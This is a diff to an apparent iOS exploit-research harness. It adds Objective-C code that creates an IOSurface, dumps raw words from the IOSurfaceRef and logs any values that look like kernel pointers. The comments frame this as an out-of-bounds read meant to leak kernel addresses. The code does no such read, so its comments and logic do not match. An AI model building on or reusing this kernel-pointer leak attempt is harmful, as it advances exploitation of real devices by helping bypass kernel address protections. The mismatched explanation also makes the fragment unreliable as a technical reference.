@@ -1460,6 +1460,31 @@ cleanup:
                                             }
                                         }
                                         scopeNote(r, [NSString stringWithFormat:@"  kernel ptrs found: %d", kptrs]);
+
+                                        // ---- Try leaking IOSurfaceRef kernel pointers ----
+                                        // Place IOSurface after our buffer, then OOB read past it
+                                        @try {
+                                            NSDictionary *sp = @{@"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4};
+                                            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+                                            if (s) {
+                                                uint32_t sid = (uint32_t)IOSurfaceGetID(s);
+                                                scopeNote(r, [NSString stringWithFormat:@"  IOSurface for leak: id=%u", sid]);
+                                                // The IOSurfaceRef itself is a CFType — its internal structure
+                                                // may contain kernel pointers. Dump the first 32 bytes of the ref.
+                                                uint64_t *sref = (uint64_t *)s;
+                                                scopeNote(r, [NSString stringWithFormat:
+                                                    @"  IOSurfaceRef[0]=0x%016llx [1]=0x%016llx [2]=0x%016llx [3]=0x%016llx",
+                                                    sref[0], sref[1], sref[2], sref[3]]);
+                                                for (int j = 0; j < 4; j++) {
+                                                    if (sref[j] > 0xfffffff000000000ULL)
+                                                        scopeNote(r, [NSString stringWithFormat:
+                                                            @"  KERNEL PTR in IOSurfaceRef[%d]: 0x%016llx", j, sref[j]]);
+                                                }
+                                                CFRelease(s);
+                                            }
+                                        } @catch (NSException *e) {
+                                            scopeNote(r, [NSString stringWithFormat:@"  IOSurface leak exception: %@", e]);
+                                        }
                                         // Also dump hex
                                         NSMutableString *hex = [NSMutableString string];
                                         for (size_t j = 0; j < 64 && j < rlen; j++)
